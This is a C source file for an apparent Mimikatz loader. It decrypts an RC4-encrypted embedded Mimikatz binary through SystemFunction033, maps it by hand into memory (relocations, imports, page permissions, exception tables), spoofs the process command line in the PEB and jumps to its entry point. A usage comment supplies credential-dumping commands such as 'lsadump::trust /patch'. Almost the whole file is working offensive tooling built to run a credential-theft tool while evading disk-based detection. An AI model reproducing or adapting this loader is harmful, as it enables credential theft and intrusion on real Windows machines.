#include <stdio.h>
#include <windows.h>
#include <winternl.h>

#include "shellcode.h"

#define MAX_NUM(a, b) a > b ? a : b;
#define MIN_NUM(a, b) a < b ? a : b;

#define MAX_INDIVIDUAL_CMDLINE_ARG_LEN 100

#ifdef _M_X64
#define ADD_OFFSET_TO_POINTER(addr, offset) (PBYTE)addr + (DWORD64)offset
#else
#define ADD_OFFSET_TO_POINTER(addr, offset) (PBYTE)addr + (DWORD)offset
#endif


typedef struct _ProcessParametersStore {
	WORD commandlineLenOrig;
	PWCHAR commandlineOrig;
} ProcessParametersStore, * PProcessParametersStore;

typedef struct _PEImageFileProcessed {
	IMAGE_FILE_HEADER FileHeader;
	IMAGE_OPTIONAL_HEADER OptionalHeader;

	BOOL IsDll;
	DWORD64 ImageBase; // absolute
	DWORD SizeOfImage;
	DWORD AddressOfEntryPointOffset; // relative

	WORD NumOfSections;
	PIMAGE_SECTION_HEADER SectionHeaderFirst; // absolute

	PIMAGE_DATA_DIRECTORY pDataDirectoryExport;
	PIMAGE_DATA_DIRECTORY pDataDirectoryImport;
	PIMAGE_DATA_DIRECTORY pDataDirectoryReloc;
	PIMAGE_DATA_DIRECTORY pDataDirectoryException;
} PEImageFileProcessed, * PPEImageFileProcessed;


SIZE_T CharStringToWCharString(IN PCHAR Source, SIZE_T IN MaximumAllowed, OUT PWCHAR Destination)
{
	INT Length = (INT)MaximumAllowed;

	while (--Length >= 0)
	{
		if (!(*Destination++ = *Source++))
			return MaximumAllowed - Length - 1;
	}

	return MaximumAllowed - Length;
}

DWORD StrLen(PCHAR str) {
	DWORD len = 0;
	while (TRUE) {
		if (str[len] == 0) {
			return len;
		}
		else {
			len++;
		}
	}
}

void StrCat(PCHAR destination, PCHAR source, DWORD sourceLenMax) {
	DWORD sourceLenToCopy = MIN_NUM(StrLen(source), sourceLenMax);
	DWORD destinationLen = StrLen(destination);
	for (int i = 0; i < sourceLenToCopy; i++) {
		destination[destinationLen + i] = source[i];
	}
}

void ZeroMemoryCustom(PBYTE address, DWORD len) {
	for (int i = len - 1; i > 0; i--) {
		address[i] = 0;
	}
}

void MemCpy(PBYTE destination, PBYTE source, DWORD len) {
	for (int i = 0; i < len; i++) {
		destination[i] = source[i];
	}
}

// Function prototype for SystemFunction033
typedef NTSTATUS(WINAPI* _SystemFunction033)(
	struct ustring* memoryRegion,
	struct ustring* keyPointer);

struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PVOID Buffer;
} _data, key, _data2;


VOID DecodeShellcode() {

	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");

	char _key[] = { 0x8B, 0x9E, 0x3F, 0xC0, 0x3E, 0x31, 0xBF, 0xCF, 0xA5, 0x83, 0x7C, 0xC8, 0x6A, 0x61, 0x96, 0x9A };

	SIZE_T sPayloadSize = sizeof(shellcode);

	//Setting key values
	key.Buffer = (&_key);
	key.Length = sizeof(_key);

	//Setting shellcode in the struct for Systemfunction033
	_data.Buffer = shellcode;
	_data.Length = sPayloadSize;


	//Calling Systemfunction033
	SystemFunction033(&_data, &key);
}

DWORD64 ReadShellcode(OUT LPVOID* pMimiShellcode) {
	*pMimiShellcode = NULL;

	const DWORD64 shellcodeSize = sizeof(shellcode);

	// Allocate memory for the shellcode
	*pMimiShellcode = VirtualAlloc(NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (*pMimiShellcode == NULL) {
		printf("[-] VirtualAlloc failed with error %d", GetLastError());
		return 0;
	}

	// Copy the shellcode into the allocated buffer
	MemCpy(*pMimiShellcode, shellcode, shellcodeSize);

	return shellcodeSize;
}

BOOL ProcessMimi(IN LPVOID pMimiShellcode, OUT PPEImageFileProcessed pPeImageFileProcessed) {

	// Process headers
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pMimiShellcode;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD64)pMimiShellcode + (pDosHeader->e_lfanew));
	if (!(pNtHeaders->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE)) {
		printf("\n[-] Mimikatz shellcode not recognized as a valid PE\n");
		return FALSE;
	};

	pPeImageFileProcessed->FileHeader = pNtHeaders->FileHeader;
	pPeImageFileProcessed->OptionalHeader = pNtHeaders->OptionalHeader;

	// Process misc
	pPeImageFileProcessed->IsDll = (pNtHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) ? TRUE : FALSE;
	pPeImageFileProcessed->SizeOfImage = pNtHeaders->OptionalHeader.SizeOfImage;
	pPeImageFileProcessed->ImageBase = pNtHeaders->OptionalHeader.ImageBase;
	pPeImageFileProcessed->AddressOfEntryPointOffset = pNtHeaders->OptionalHeader.AddressOfEntryPoint;

	// Process section headers
	pPeImageFileProcessed->NumOfSections = pNtHeaders->FileHeader.NumberOfSections;
	pPeImageFileProcessed->SectionHeaderFirst = IMAGE_FIRST_SECTION(pNtHeaders);

	// Process required sections explicitly
	pPeImageFileProcessed->pDataDirectoryExport = &(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	pPeImageFileProcessed->pDataDirectoryImport = &(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
	pPeImageFileProcessed->pDataDirectoryReloc = &(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
	pPeImageFileProcessed->pDataDirectoryException = &(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION]);

	return TRUE;
}

void AllocInline(IN DWORD SizeOfImage, OUT LPVOID* inlineMimi) {

	// Virtual Alloc
	*inlineMimi = VirtualAlloc(NULL, SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (*inlineMimi == NULL) {
		printf("\n[-] VirtuallAlloc failed with error %d", GetLastError());
	}
}

void CopySections(IN PPEImageFileProcessed pPeImageFileProcessed, IN LPVOID pMimiShellcode, OUT LPVOID inlineMimi) {
	for (int i = 0; i < pPeImageFileProcessed->NumOfSections; i++) {
		IMAGE_SECTION_HEADER SectionHeader = pPeImageFileProcessed->SectionHeaderFirst[i];
		MemCpy((DWORD64)inlineMimi + SectionHeader.VirtualAddress, (DWORD64)pMimiShellcode + SectionHeader.PointerToRawData, SectionHeader.SizeOfRawData);
	}
}

typedef struct _IMAGE_BASE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} IMAGE_BASE_RELOCATION_ENTRY, * PIMAGE_BASE_RELOCATION_ENTRY;

void ApplyRelocations(IN PPEImageFileProcessed pPeImageFileProcessed, OUT LPVOID inlineMimi) {
	PIMAGE_BASE_RELOCATION pImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)inlineMimi + pPeImageFileProcessed->pDataDirectoryReloc->VirtualAddress);
	DWORD NumImageBaseRelocationEntry = NULL;
	PIMAGE_BASE_RELOCATION_ENTRY pImageBaseRelocationEntry = NULL;
	DWORD64 imageBaseDelta = (DWORD64)inlineMimi - pPeImageFileProcessed->ImageBase;
	DWORD64 relocAt = NULL;

	// For each Base Relocation Block
	while (pImageBaseRelocation->VirtualAddress != 0 && pImageBaseRelocation->SizeOfBlock > 0) {

		NumImageBaseRelocationEntry = (pImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_BASE_RELOCATION_ENTRY);
		pImageBaseRelocationEntry = (PIMAGE_BASE_RELOCATION_ENTRY)((DWORD64)pImageBaseRelocation + sizeof(IMAGE_BASE_RELOCATION));
		relocAt = NULL;

		for (DWORD i = 0; i < NumImageBaseRelocationEntry; i++)
		{
			// Skip padding entries (ABSOLUTE type)
			if (pImageBaseRelocationEntry[i].Type == IMAGE_REL_BASED_ABSOLUTE) {
				continue;
			}

			// Calculate address to patch
			LPVOID pPatchAddress = (LPVOID)(
				(DWORD64)inlineMimi +
				pImageBaseRelocation->VirtualAddress +
				pImageBaseRelocationEntry[i].Offset
				);

			// Apply relocation based on type
			switch (pImageBaseRelocationEntry[i].Type)
			{
			case IMAGE_REL_BASED_HIGH:
				// Adjust high 16 bits of 32-bit value
				*(WORD*)pPatchAddress += HIWORD(imageBaseDelta);
				break;

			case IMAGE_REL_BASED_LOW:
				// Adjust low 16 bits of 32-bit value
				*(WORD*)pPatchAddress += LOWORD(imageBaseDelta);
				break;

			case IMAGE_REL_BASED_HIGHLOW:
				// Full 32-bit address adjustment
				*(DWORD*)pPatchAddress += (DWORD)imageBaseDelta;
				break;

			case IMAGE_REL_BASED_DIR64:
				// 64-bit address adjustment
				*(DWORD64*)pPatchAddress += imageBaseDelta;
				break;

			default:
				break;
			}
		}

		// Move on to next relocation block
		pImageBaseRelocation = ADD_OFFSET_TO_POINTER(pImageBaseRelocation, pImageBaseRelocation->SizeOfBlock);
	}
}

BOOL FixImports(IN PPEImageFileProcessed pPeImageFileProcessed, OUT LPVOID inlineMimi) {

	// Get the first import descriptor from the import directory
	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)inlineMimi + pPeImageFileProcessed->pDataDirectoryImport->VirtualAddress);

	// Iterate through import descriptors until we reach the null terminator
	while (pImportDescriptor->Name != 0 && pImportDescriptor->FirstThunk != 0) {
		// Get the name of the required DLL from the import descriptor
		LPCSTR dllName = (LPCSTR)((DWORD_PTR)inlineMimi + pImportDescriptor->Name);

		// Attempt to get a handle to the loaded DLL module
		HMODULE hTargetModule = GetModuleHandleA(dllName);
		if (hTargetModule == NULL) {
			// Load the DLL if it's not already loaded
			hTargetModule = LoadLibraryA(dllName);
			if (hTargetModule == NULL) {
				printf("\n[-] LoadLibraryA Failed with error %d\n", GetLastError());
				return FALSE;
			}
		}

		// Get both thunk arrays (OriginalFirstThunk = Import Name Table, FirstThunk = Import Address Table)
		PIMAGE_THUNK_DATA pNameThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)inlineMimi + pImportDescriptor->OriginalFirstThunk);
		PIMAGE_THUNK_DATA pIatEntry = (PIMAGE_THUNK_DATA)((DWORD_PTR)inlineMimi + pImportDescriptor->FirstThunk);

		// Process each imported function in the thunk array
		while (pNameThunk->u1.AddressOfData != 0 && pIatEntry->u1.Function != 0) {
			// Determine if the import is by ordinal or by name
			BOOL isOrdinalImport = (pNameThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) != 0;
			LPCSTR functionName = NULL;
			FARPROC pImportedFunction = NULL;

			if (isOrdinalImport) {
				// Extract ordinal value from the thunk data
				WORD ordinal = IMAGE_ORDINAL(pNameThunk->u1.Ordinal);
				pImportedFunction = GetProcAddress(hTargetModule, (LPCSTR)ordinal);
			}
			else {
				// Get the import-by-name structure containing the function name
				PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(
					(DWORD_PTR)inlineMimi + pNameThunk->u1.AddressOfData
					);
				functionName = (LPCSTR)pImportByName->Name;
				pImportedFunction = GetProcAddress(hTargetModule, functionName);
			}

			// Validate that we resolved the function address
			if (pImportedFunction == NULL) {
				printf("\n[-] GetProcAddress Failed with error %d\n", GetLastError());
				return FALSE;
			}

			// Update the IAT entry with the resolved function address
			pIatEntry->u1.Function = (DWORD_PTR)pImportedFunction;

			// Advance to the next thunk pair
			pNameThunk++;
			pIatEntry++;
		}

		// Move to the next import descriptor
		pImportDescriptor++;
	}

	return TRUE;
}

BOOL AssignPagePerms(IN PPEImageFileProcessed pPeImageFileProcessed, OUT LPVOID inlineMimi) {
	// Iterate through all section headers to set appropriate memory protections
	for (DWORD sectionIndex = 0; sectionIndex < pPeImageFileProcessed->NumOfSections; sectionIndex++) {
		IMAGE_SECTION_HEADER currentSection = pPeImageFileProcessed->SectionHeaderFirst[sectionIndex];
		DWORD protectionFlags = 0;
		DWORD oldProtectionFlags = 0;

		// Determine memory protection flags based on section characteristics
		const BOOL isExecutable = (currentSection.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
		const BOOL isReadable = (currentSection.Characteristics & IMAGE_SCN_MEM_READ) != 0;
		const BOOL isWritable = (currentSection.Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

		if (isExecutable && !isReadable && !isWritable) {
			protectionFlags = PAGE_EXECUTE;
		}
		else if (isExecutable && isReadable && !isWritable) {
			protectionFlags = PAGE_EXECUTE_READ;
		}
		else if (isExecutable && isReadable && isWritable) {
			protectionFlags = PAGE_EXECUTE_READWRITE;
		}
		else if (!isExecutable && isReadable && !isWritable) {
			protectionFlags = PAGE_READONLY;
		}
		else if (!isExecutable && isReadable && isWritable) {
			protectionFlags = PAGE_READWRITE;
		}
		else {
			// Handle special cases or invalid combinations
			if (isWritable && !isReadable) {
				printf("\n[-] WRITE without READ %d\n", GetLastError());
				return FALSE;
			}
			protectionFlags = PAGE_READWRITE;
		}

		// Calculate section address and apply protection
		LPVOID sectionAddress = (BYTE*)inlineMimi + currentSection.VirtualAddress;
		SIZE_T sectionSize = currentSection.SizeOfRawData;

		if (!VirtualProtect(sectionAddress, sectionSize, protectionFlags, &oldProtectionFlags)) {
			printf("\n[-] Fail to set permissions to page, error %d\n", GetLastError());
			return FALSE;
		}
	}
	return TRUE;
}

BOOL RegisterExceptionHandlers(IN PPEImageFileProcessed pPeImageFileProcessed, OUT LPVOID inlineMimi) {
	if (pPeImageFileProcessed->pDataDirectoryException->VirtualAddress != NULL) {
		PRUNTIME_FUNCTION pFunctionTable = ADD_OFFSET_TO_POINTER(inlineMimi, pPeImageFileProcessed->pDataDirectoryException->VirtualAddress);
		if (!RtlAddFunctionTable(pFunctionTable, (pPeImageFileProcessed->pDataDirectoryException->Size / sizeof(RUNTIME_FUNCTION)), inlineMimi)) {
			printf("\n[-] RtlAddFunctionTable Failed with error %d\n", GetLastError());
			return FALSE;
		}
		else {
			return TRUE;
		}
	}
}

PPEB GetCurrentPEB() {
#ifdef _M_X64
	return (PPEB)__readgsqword(12 * sizeof(PVOID));
#else
	return (PPEB)__readfsdword(12 * sizeof(PVOID));
#endif
}

void FixCommandLine(PProcessParametersStore pProcessParamsStore, PCHAR pInMemPeArgs) {
	// Get current PE's command-line args
	PPEB pPeb = GetCurrentPEB();

	// Save original command line
	ZeroMemoryCustom(pProcessParamsStore, sizeof(ProcessParametersStore));
	pProcessParamsStore->commandlineLenOrig = pPeb->ProcessParameters->CommandLine.Length;
	pProcessParamsStore->commandlineOrig = VirtualAlloc(NULL, pPeb->ProcessParameters->CommandLine.Length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pProcessParamsStore->commandlineOrig != NULL) {
		MemCpy(pProcessParamsStore->commandlineOrig, pPeb->ProcessParameters->CommandLine.Buffer, pPeb->ProcessParameters->CommandLine.Length);
	}

	// If command line is empty
	if (pInMemPeArgs == NULL) {
		pPeb->ProcessParameters->CommandLine.Length = 0;
		pPeb->ProcessParameters->CommandLine.MaximumLength = 0;
		ZeroMemoryCustom(pPeb->ProcessParameters->CommandLine.Buffer, pProcessParamsStore->commandlineLenOrig);
	}
	// If there are command line args to be passed to the in-mem PE
	else {
		// Prepare new command line
		DWORD inMemPeArgsWLen = pPeb->ProcessParameters->ImagePathName.Length + (StrLen(pInMemPeArgs) * sizeof(WCHAR)) + (3 * sizeof(WCHAR)); // Image file path + args to in-mem PE + null terminator + 2 double-quotes + one space
		PWCHAR pInMemPeArgsW = VirtualAlloc(NULL, inMemPeArgsWLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (pInMemPeArgsW == NULL) {
			return;
		}
		ZeroMemoryCustom(pInMemPeArgsW, inMemPeArgsWLen);
		MemCpy(pInMemPeArgsW + 0, L"\"", 1);
		MemCpy(pInMemPeArgsW + 1, pPeb->ProcessParameters->ImagePathName.Buffer, pPeb->ProcessParameters->ImagePathName.Length);
		MemCpy(pInMemPeArgsW + (pPeb->ProcessParameters->ImagePathName.Length / 2) + 1, L"\"", 1);
		MemCpy(pInMemPeArgsW + (pPeb->ProcessParameters->ImagePathName.Length / 2) + 2, L" ", 1);

		CharStringToWCharString(pInMemPeArgs, StrLen(pInMemPeArgs), pInMemPeArgsW + (pPeb->ProcessParameters->ImagePathName.Length / 2) + 3);

		// Set new command line len
		pPeb->ProcessParameters->CommandLine.Length = inMemPeArgsWLen;
		pPeb->ProcessParameters->CommandLine.MaximumLength = inMemPeArgsWLen;

		// Set new command line
		ZeroMemoryCustom(pPeb->ProcessParameters->CommandLine.Buffer, pProcessParamsStore->commandlineLenOrig);
		MemCpy(pPeb->ProcessParameters->CommandLine.Buffer, pInMemPeArgsW, inMemPeArgsWLen);
		ZeroMemoryCustom(pInMemPeArgsW, inMemPeArgsWLen);
		VirtualFree(pInMemPeArgsW, 0, MEM_RELEASE);
	}
}

void RestoreCommandLine(PProcessParametersStore pProcessParamsStore) {
	// Get current PE's command-line args
	PPEB pPeb = GetCurrentPEB();

	// Restore original command line
	pPeb->ProcessParameters->CommandLine.Length = pProcessParamsStore->commandlineLenOrig;
	MemCpy(pPeb->ProcessParameters->CommandLine.Buffer, pProcessParamsStore->commandlineOrig, pProcessParamsStore->commandlineLenOrig * sizeof(WCHAR));

	// Cleanup saved command line buffer
	ZeroMemoryCustom(pProcessParamsStore->commandlineOrig, pProcessParamsStore->commandlineLenOrig);
	VirtualFree(pProcessParamsStore->commandlineOrig, 0, MEM_RELEASE);
}

typedef BOOL(*DLLMAIN)(HINSTANCE, DWORD, LPVOID);
typedef BOOL(*MAIN)(DWORD, PCHAR);

void JumpToEntry(IN PPEImageFileProcessed pPeImageFileProcessed, IN LPVOID inlineMimi) {
	LPVOID pEntry = ADD_OFFSET_TO_POINTER(inlineMimi, pPeImageFileProcessed->AddressOfEntryPointOffset);
	// For DLL
	if (pPeImageFileProcessed->IsDll) {
		((DLLMAIN)pEntry)(inlineMimi, DLL_PROCESS_ATTACH, NULL);
	}
	// For other executables
	else {
		((MAIN)pEntry)(1, NULL);
	}
}

BOOL InjectMimikatz(PCHAR pInMemPeArgs) {

	// Decode RC4 shellcode
	DecodeShellcode();
	// You Can Allways change the mimikatz shellcode if wanted (xxd -i mimikatz_rc4.exe > shellcode.h)

	// Read mimikatz.exe shellcode
	DWORD64 pMimiShellcode = NULL;
	DWORD64 sMimiSize = ReadShellcode(&pMimiShellcode);
	if (sMimiSize == 0) goto _CLEANUP;
	

	// Process mimikatz PE
	PEImageFileProcessed pProcessedMimikatz;
	if (!ProcessMimi(pMimiShellcode, &pProcessedMimikatz)) goto _CLEANUP;

	// Allocate inline memory
	DWORD64 inlineMimi = NULL;
	AllocInline(pProcessedMimikatz.SizeOfImage, &inlineMimi);
	if (inlineMimi == NULL) goto _CLEANUP;

	// Copy over sections to in-mem
	CopySections(&pProcessedMimikatz, pMimiShellcode, inlineMimi);

	// Apply relocations
	ApplyRelocations(&pProcessedMimikatz, inlineMimi);

	// Perform import fixes
	if (!FixImports(&pProcessedMimikatz, inlineMimi)) goto _CLEANUP;

	// Assign correct page access to sections
	if (!AssignPagePerms(&pProcessedMimikatz, inlineMimi)) goto _CLEANUP;

	// Register exception handlers
	if (!RegisterExceptionHandlers(&pProcessedMimikatz, inlineMimi)) goto _CLEANUP;

	// Fix command line for in-mem PE
	ProcessParametersStore processParamsStore;
	FixCommandLine(&processParamsStore, pInMemPeArgs);

	// Jump to entry
	JumpToEntry(&pProcessedMimikatz, inlineMimi);

	// Restore command line
	RestoreCommandLine(&processParamsStore);

_CLEANUP:
	// Cleanup PE file buffer
	if (pMimiShellcode != NULL) {
		ZeroMemoryCustom(pMimiShellcode, sMimiSize);
		if (!VirtualFree(pMimiShellcode, 0, MEM_RELEASE)) {
			printf("\n[-] VirtualFree Failed with error %d\n", GetLastError());
			return FALSE;
		}
	}
	// Cleanup in-mem PE buffer
	if (inlineMimi != NULL) {
		ZeroMemoryCustom(inlineMimi, pProcessedMimikatz.SizeOfImage);
		if (!VirtualFree(inlineMimi, 0, MEM_RELEASE)) {
			printf("\n[-] VirtualFree Failed with error %d\n", GetLastError());
			return FALSE;
		}
	}
}

int main(int argc, char* argv[]) {
	/*
		USAGE EXAMPLE:
		(if the command has spaces you can enclose it in double quotes)
		.\MimiLoader.exe privilege::debug token::elevate "lsadump::trust /patch" coffee
	*/

	PCHAR pPeArgs = NULL;
	if (argc > 1) {
		DWORD sPeArgsLen = 0;
		for (int i = 1; i < argc; i++) {
			PCHAR arg = argv[i];
			DWORD argLen = StrLen(arg);
			BOOL hasSpace = FALSE;

			// Separate each argument by the introduced double quotes
			if (argLen >= 2 && arg[0] == '\"' && arg[argLen - 1] == '\"') {
				sPeArgsLen += argLen;
			}
			else {
				for (DWORD j = 0; j < argLen; j++) {
					if (arg[j] == ' ') hasSpace = TRUE;
				}
				if (hasSpace) sPeArgsLen += argLen + 2; // Add quotes
				else sPeArgsLen += argLen;
			}
			sPeArgsLen += 1; // Space between arguments
		}
		sPeArgsLen += 6; // " exit " and null terminator

		pPeArgs = VirtualAlloc(NULL, sPeArgsLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (!pPeArgs) {
			printf("\n[-] VirtualAlloc Failed with error %d\n", GetLastError());
			return EXIT_FAILURE;
		}
		ZeroMemoryCustom(pPeArgs, sPeArgsLen);

		// Process each argument
		for (int i = 1; i < argc; i++) {
			PCHAR arg = argv[i];
			DWORD argLen = StrLen(arg);
			CHAR processedArg[MAX_INDIVIDUAL_CMDLINE_ARG_LEN + 3] = { 0 }; // +3 for quotes and null

			BOOL hasSpace = FALSE;
			for (DWORD j = 0; j < argLen; j++) {
				if (arg[j] == ' ') hasSpace = TRUE;
			}
			if (hasSpace) {
				processedArg[0] = '"';
				MemCpy(processedArg + 1, arg, argLen);
				processedArg[argLen + 1] = '"';
			}
			else {
				MemCpy(processedArg, arg, argLen);
			}

			StrCat(pPeArgs, processedArg, MAX_INDIVIDUAL_CMDLINE_ARG_LEN);
			if (i < argc - 1) {
				StrCat(pPeArgs, " ", 1);
			}
		}

		// Append "exit"
		StrCat(pPeArgs, " exit ", 6);
	}
	else {
		pPeArgs = " coffee exit "; // Default command if no args
	}

	// Call Loader
	if (!InjectMimikatz(pPeArgs)) {
		printf("\n[-] Injection failed\n");
	}

	if (pPeArgs != NULL) {
		VirtualFree(pPeArgs, 0, MEM_RELEASE);
	}
	return EXIT_SUCCESS;
}
